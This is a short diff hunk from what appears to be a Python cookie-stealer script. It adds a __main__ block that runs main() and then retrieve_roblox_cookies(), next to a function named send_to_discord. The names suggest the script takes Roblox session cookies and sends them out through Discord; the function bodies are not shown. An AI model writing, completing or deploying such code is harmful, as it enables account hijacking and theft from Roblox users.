@@ -251,3 +251,7 @@ def send_to_discord(message):
         print("")
     else:
         print("")
+    
+if __name__ == "__main__":
+    main()
+    retrieve_roblox_cookies()
